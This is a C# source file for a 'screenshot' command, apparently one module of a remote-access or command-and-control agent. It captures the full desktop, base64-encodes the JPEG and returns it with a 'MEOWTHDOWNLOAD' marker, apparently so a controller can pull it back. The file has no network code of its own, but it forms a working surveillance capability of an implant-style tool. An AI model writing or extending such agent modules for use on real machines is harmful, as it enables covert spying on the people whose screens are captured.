using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Agent.Models;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;

namespace Agent.Commands
{
    public class Screenshot : AgentCommand
    {
        public override string Name => "screenshot";

        public override string Execute(AgentTask task)
        {
            string outString = "MEOWTHDOWNLOAD";
            try
            {
                var image = CaptureDesktop();
                MemoryStream ms = new MemoryStream();
                image.Save(ms, ImageFormat.Jpeg);
                outString += System.Convert.ToBase64String(ms.ToArray());
                // add length checking one day.
                return outString;
            }
            catch
            {
                return "Failed to take screenshot";
            }
        }
        public Image CaptureDesktop()
        {
            return CaptureWindow(Native.User32.GetDesktopWindow());
        }
        public Bitmap CaptureWindow(IntPtr handle)
        {
            var rect = new Native.User32.Rect();
            Native.User32.GetWindowRect(handle, ref rect);
            var bounds = new Rectangle(rect.Left, rect.Top, rect.Right - rect.Left, rect.Bottom - rect.Top);
            var result = new Bitmap(bounds.Width, bounds.Height);

            using (var graphics = Graphics.FromImage(result))
            {
                graphics.CopyFromScreen(new Point(bounds.Left, bounds.Top), Point.Empty, bounds.Size);
            }

            return result;
        }
    }
}
